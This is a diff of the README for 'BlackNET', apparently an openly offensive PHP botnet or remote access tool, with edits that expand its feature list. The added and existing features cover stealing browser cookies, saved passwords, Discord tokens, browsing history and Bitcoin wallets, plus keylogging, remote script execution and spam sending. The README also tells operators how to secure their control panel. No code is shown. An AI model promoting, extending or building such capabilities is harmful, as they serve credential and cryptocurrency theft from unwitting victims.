@@ -32,18 +32,21 @@ Developed By: Black.Hacker
  5. Take Screenshot
  6. Steal Firefox Cookies
  7. Steal Saved Passwords
- 8. Keylogger
- 9. Execute Scripts
-10. Computer Operations
-    + Restart
-    + Shutdown
-    + Logout
-11. Bitcoint Wallet Stealer
-12. Uninstall Client
-13. Move Client
-14. Blacklist Client
-15. Update Client
-16. Close Client
+ 8. Steal Chrome Cookies
+ 9. Steal Discord Token
+ 10. Steal Chrome Hisory
+ 11. Send Spam Emails
+ 12. Keylogger
+ 13. Execute Scripts
+ 14. Computer Operations
+     + Restart
+     + Shutdown
+     + Logout
+ 15. Bitcoint Wallet Stealer
+ 16. Uninstall Client
+ 17. Move Client
+ 18. Blacklist Client
+ 19. Close Client
  
 ## Requirements
 1. PHP >=  7.0
@@ -65,7 +68,7 @@ Developed By: Black.Hacker
 
 ## How to secure BlackNET
 1. Remove install.php and update.php
-2. Changer username and password
+2. Change username and password
 3. Add an email address to your account
 4. Enable Captcha using Google reCaptcha v2
 5. Enable 2FA on your account
